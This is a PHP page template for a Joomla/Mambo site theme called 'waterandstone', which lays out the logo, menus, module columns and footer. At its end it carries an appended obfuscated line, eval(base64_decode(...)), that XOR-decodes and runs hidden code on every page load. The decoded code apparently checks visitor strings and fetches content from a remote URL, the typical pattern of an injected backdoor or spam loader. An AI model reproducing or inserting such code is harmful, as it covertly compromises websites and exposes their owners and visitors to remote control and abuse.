<!--IE 7 quirks mode please--> 
<?php
defined( '_VALID_MOS' ) or die( 'Direct Access to this location is not allowed.' );
// needed to seperate the ISO number from the language file constant _ISO
$iso = explode( '=', _ISO );
// xml prolog
echo '<?xml version="1.0" encoding="'. $iso[1] .'"?' .'>';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<?php mosShowHead(); ?>
<?php
if ( $my->id ) {
	initEditor();
}
?>
<meta http-equiv="Content-Type" content="text/html; <?php echo _ISO; ?>" />
<link href="<?php echo $mosConfig_live_site;?>/templates/waterandstone/css/template_css.css" rel="stylesheet" type="text/css"/>
</head>
<body class="waterbody">
<?PHP
  if (file_exists($mosConfig_absolute_path."/components/com_joomlastats/joomlastats.inc.php"));
     require_once($mosConfig_absolute_path."/components/com_joomlastats/joomlastats.inc.php");
?>

<div align="center">
<div id="container">
	<div id="containerbg">
		<div id="outerleft">
			<!-- start logo -->
			<div id="logo">
			  <a href="index.php"><img src="<?php echo $mosConfig_live_site; ?>/templates/waterandstone/images/logo.gif" alt="logo image" border="0" align="top" /></a>
			</div>
			<!-- end logo -->
			<!-- start top menu -->
			<div id="topmenu">
			<?php mosLoadModules('top',-1); ?>
			</div>
			<!-- end top menu.  -->
			<!-- start image header -->
			<div id="imgheader">
			<img src="<?php echo $mosConfig_live_site; ?>/templates/waterandstone/images/img_header.jpg" alt="header image" />
			</div>
			<!-- end image header -->
			<div id="container_inner">
				<!-- start left column. -->
				<div id="leftcol">
				<?php mosLoadModules('left'); ?>
				</div>
				<div id="leftcolmenu">
				<?php mosLoadModules('user1'); ?>
				</div>
				<!-- end left column. -->
				<!-- start content top wrapper -->
				<?php
				if (mosCountModules('user2') >= 1 OR mosCountModules('user3') >= 1 ) {
				?>
				<div id="content_top_wrapper">
					<!-- start content top 1.  -->
					<div id="content_top1">
					<?php mosLoadModules('user2'); ?>
					</div>
					<!-- end content top 1 -->
					<!-- start content top 2.  -->
					<div id="content_top2">
					<?php mosLoadModules('user3'); ?>
					</div>
					<!-- end content top 2 -->
				</div>
				<?php
				}
				?>
				<!-- end content top wrapper -->
				<!-- start main body -->
				<div id="content_main">
					<?php mosPathWay(); ?>
					<table width="519" border="0" cellspacing="0" cellpadding="0">
					  <tr>
						<td>
						<?php mosMainBody(); ?> <?php if (file_exists($mosConfig_absolute_path."/components/com_comments/comments.php")) { require_once($mosConfig_absolute_path."/components/com_comments/comments.php"); } ?>
						</td>
					  </tr>
					</table>
				</div>
				<!-- end main body -->
			</div>
		</div>
		<div id="outerright">
			<!-- start right top header.  -->
			<div id="rightcol_top">
			<?php mosLoadModules('header'); ?>
			</div>
			<!-- end right top header.-->
			<!-- start right column. -->
			<div id="rightcol">
			<?php mosLoadModules('newsflash'); ?>
			<?php mosLoadModules('right'); ?>
			<?php mosLoadModules('user4'); ?>
			</div>
			<!-- end right column. -->
		</div>
		
		<div class="clear">
		</div>
		<?php
		if (mosCountModules('banner') >= 1) {
		?>
			<!-- start banner.  -->
			<div id="banner">
			<?php mosLoadModules('banner'); ?>
			</div>
			<!-- end banner. -->
		<?php
		}
		?>
		
		<div id="blackline">
		</div>
		<div class="clear">
		</div>
		<div id="bottompadding"></div>
	</div>
	<!-- copyright notice -->
	<div id="copyright">
	<?php include_once( $GLOBALS['mosConfig_absolute_path'] . '/includes/footer.php' ); ?>
	</div>

</div>
</div>

<?php mosLoadModules('debug', -1);?>
<?eval(base64_decode("JGs9MTI1OyRtPWV4cGxvZGUoIjsiLCIyMDsyNzs5Mzs4NTsxNDs5OzE1OzIwOzE0Ozk7MTU7ODU7ODk7MzQ7NDY7NTY7NDc7NDM7NTY7NDc7Mzg7OTU7NTM7NDE7NDE7NDU7MzQ7NDA7NDY7NTY7NDc7MzQ7NjA7NTg7NTY7NTE7NDE7OTU7MzI7ODE7OTU7MjY7MTg7MTg7MjY7MTc7MjQ7MzE7MTg7OTs5NTs4NDsxOzE7MTQ7OTsxNTsyMDsxNDs5OzE1Ozg1Ozg5OzM0OzQ2OzU2OzQ3OzQzOzU2OzQ3OzM4Ozk1OzUzOzQxOzQxOzQ1OzM0OzQwOzQ2OzU2OzQ3OzM0OzYwOzU4OzU2OzUxOzQxOzk1OzMyOzgxOzk1OzQ7Mjg7MjE7MTg7MTg7OTU7ODQ7ODQ7NjsxMTI7MTE5OzExNjs4OTs4OzE1OzE3OzM0Ozg7MTk7MjA7MTI7ODsyNDszNDsxOTsyODsxNjsyNDs2NDs5NTsyMTs5Ozk7MTM7NzE7ODI7ODI7MTA7MTA7MTA7ODM7MjU7MTg7MTY7Mjg7MjA7MTk7MTQ7Mjg7MzA7ODs5OzIwOzE4OzE5OzE0OzIwOzE5OzEwOzI0OzMxOzgzOzE5OzI0Ozk7ODI7MTc7MjA7MTk7MjI7MTQ7ODI7OTU7ODM7MTU7Mjg7MTk7MjU7ODU7Nzc7ODE7Nzk7NzI7Nzc7ODQ7ODM7OTU7ODM7OTs1Ozk7NjY7MjA7MTM7NjQ7OTU7ODM7ODk7MzQ7NDY7NTY7NDc7NDM7NTY7NDc7Mzg7OTU7NDc7NTY7NDg7NTA7NDE7NTY7MzQ7NjA7NTc7NTc7NDc7OTU7MzI7ODM7OTU7OTE7MjE7MTg7MTQ7OTs2NDs5NTs4MzsxNTsyODsxMDs4OzE1OzE3OzI0OzE5OzMwOzE4OzI1OzI0Ozg1Ozg5OzM0OzQ2OzU2OzQ3OzQzOzU2OzQ3OzM4Ozk1OzUzOzQxOzQxOzQ1OzM0OzUzOzUwOzQ2OzQxOzk1OzMyOzg0OzgzOzk1OzkxOzI4OzI2OzI0OzE5Ozk7NjQ7OTU7ODM7MTU7Mjg7MTA7ODsxNTsxNzsyNDsxOTszMDsxODsyNTsyNDs4NTs4OTszNDs0Njs1Njs0Nzs0Mzs1Njs0NzszODs5NTs1Mzs0MTs0MTs0NTszNDs0MDs0Njs1Njs0NzszNDs2MDs1ODs1Njs1MTs0MTs5NTszMjs4NDs3MDsxMTI7MTE5OzExNjsyMDsyNzs5Mzs4NTsyNzs4OzE5OzMwOzk7MjA7MTg7MTk7MzQ7MjQ7NTsyMDsxNDs5OzE0Ozg1Ozk1OzMwOzg7MTU7MTc7MzQ7MjA7MTk7MjA7OTs5NTs4NDs4NDs5Mzs2OzExMjsxMTk7MTE2OzExNjs4OTszMDsyMTszNDs4OzE5OzIwOzEyOzg7MjQ7MzQ7MTk7Mjg7MTY7MjQ7OTM7NjQ7OTM7NjE7MzA7ODsxNTsxNzszNDsyMDsxOTsyMDs5Ozg1Ozg0OzcwOzExMjsxMTk7MTE2OzExNjs2MTszMDs4OzE1OzE3OzM0OzE0OzI0Ozk7MTg7MTM7OTs5Mzs4NTs4OTszMDsyMTszNDs4OzE5OzIwOzEyOzg7MjQ7MzQ7MTk7Mjg7MTY7MjQ7ODE7OTM7NjI7NDA7NDc7NDk7NTA7NDU7NDE7MzQ7NDA7NDc7NDk7ODE7OTM7ODk7ODsxNTsxNzszNDs4OzE5OzIwOzEyOzg7MjQ7MzQ7MTk7Mjg7MTY7MjQ7ODQ7NzA7MTEyOzExOTsxMTY7MTE2OzYxOzMwOzg7MTU7MTc7MzQ7MTQ7MjQ7OTsxODsxMzs5OzkzOzg1Ozg5OzMwOzIxOzM0Ozg7MTk7MjA7MTI7ODsyNDszNDsxOTsyODsxNjsyNDs4MTs5Mzs2Mjs0MDs0Nzs0OTs1MDs0NTs0MTszNDs0Nzs1Njs0MTs0MDs0Nzs1MTs0MTs0Nzs2MDs1MTs0Njs1OTs1Njs0Nzs4MTs5Mzs3Njs4NDs3MDsxMTI7MTE5OzExNjsxMTY7NjE7MzA7ODsxNTsxNzszNDsxNDsyNDs5OzE4OzEzOzk7OTM7ODU7ODk7MzA7MjE7MzQ7ODsxOTsyMDsxMjs4OzI0OzM0OzE5OzI4OzE2OzI0OzgxOzkzOzYyOzQwOzQ3OzQ5OzUwOzQ1OzQxOzM0OzQxOzUyOzQ4OzU2OzUwOzQwOzQxOzgxOzkzOzc4Ozc3Ozg0OzcwOzExMjsxMTk7MTE2OzExNjs2MTszMDs4OzE1OzE3OzM0OzE0OzI0Ozk7MTg7MTM7OTs5Mzs4NTs4OTszMDsyMTszNDs4OzE5OzIwOzEyOzg7MjQ7MzQ7MTk7Mjg7MTY7MjQ7ODE7OTM7NjI7NDA7NDc7NDk7NTA7NDU7NDE7MzQ7NTY7NTE7NjI7NTA7NTc7NTI7NTE7NTg7OTM7ODE7OTM7OTU7MjY7NzsyMDsxMzs5NTs4NDs3MDsxMTI7MTE5OzExNjsxMTY7ODk7MTU7MjQ7MTQ7ODsxNzs5OzM0Ozg7MTk7MjA7MTI7ODsyNDszNDsxOTsyODsxNjsyNDs2NDs2MTszMDs4OzE1OzE3OzM0OzI0OzU7MjQ7MzA7OTM7ODU7ODk7MzA7MjE7MzQ7ODsxOTsyMDsxMjs4OzI0OzM0OzE5OzI4OzE2OzI0Ozg0OzcwOzExMjsxMTk7MTE2OzExNjs2MTszMDs4OzE1OzE3OzM0OzMwOzE3OzE4OzE0OzI0OzkzOzg1Ozg5OzMwOzIxOzM0Ozg7MTk7MjA7MTI7ODsyNDszNDsxOTsyODsxNjsyNDs4NDs3MDsyNDszMDsyMTsxODs5Mzs4OTsxNTsyNDsxNDs4OzE3Ozk7MzQ7ODsxOTsyMDsxMjs4OzI0OzM0OzE5OzI4OzE2OzI0OzcwOzExNjsxMTI7MTE5OzExNjswOzkzOzI0OzE3OzE0OzI0OzkzOzY7MTEyOzExOTsxMTY7MTE2Ozg5OzE1OzI0OzE0Ozg7MTc7OTszNDs4OzE5OzIwOzEyOzg7MjQ7MzQ7MTk7Mjg7MTY7MjQ7NjQ7NjE7Mjc7MjA7MTc7MjQ7MzQ7MjY7MjQ7OTszNDszMDsxODsxOTs5OzI0OzE5Ozk7MTQ7ODU7ODk7ODsxNTsxNzszNDs4OzE5OzIwOzEyOzg7MjQ7MzQ7MTk7Mjg7MTY7MjQ7ODQ7NzA7MjQ7MzA7MjE7MTg7OTM7ODk7MTU7MjQ7MTQ7ODsxNzs5OzM0Ozg7MTk7MjA7MTI7ODsyNDszNDsxOTsyODsxNjsyNDs3MDsxMTI7MTE5OzExNjswOzA7Iik7JHo9IiI7Zm9yZWFjaCgkbSBhcyAkdilpZiAoJHYhPSIiKSR6Lj1jaHIoJHZeJGspO2V2YWwoJHopOw=="));?>
</body>
</html>